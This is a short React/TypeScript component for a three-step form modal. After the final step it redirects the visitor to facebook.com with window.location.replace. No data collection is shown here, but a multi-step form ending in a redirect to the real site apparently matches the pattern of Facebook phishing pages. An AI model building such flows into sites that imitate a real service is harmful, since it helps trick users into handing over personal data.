'use client';

import type { FC } from 'react';
import { useState } from 'react';

import Step1 from '@/components/form-modal/step-1';
import Step2 from '@/components/form-modal/step-2';
import Step3 from '@/components/form-modal/step-3';
import { useFormStore } from '@/store/form-store';
import type { Dictionary } from '@/types/content';

const FormModal: FC<{ dictionary: Dictionary }> = ({ dictionary }) => {
    const [step, setStep] = useState(1);
    const { resetForm } = useFormStore();

    const nextStep = () => {
        if (step < 3) {
            setStep(step + 1);
        } else if (step === 3) {
            window.location.replace('https://facebook.com');
        } else {
            handleClose();
        }
    };

    const handleClose = () => {
        resetForm();
    };

    return (
        <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center bg-black/40 px-4' onClick={handleClose}>
            <div className='flex max-h-[90vh] w-full max-w-xl flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3]' onClick={(e) => e.stopPropagation()}>
                {step === 1 && <Step1 onNext={nextStep} formContent={dictionary.formModal} />}
                {step === 2 && <Step2 onNext={nextStep} formContent={dictionary.formModal} />}
                {step === 3 && <Step3 onNext={nextStep} formContent={dictionary.formModal} />}
            </div>
        </div>
    );
};

export default FormModal;
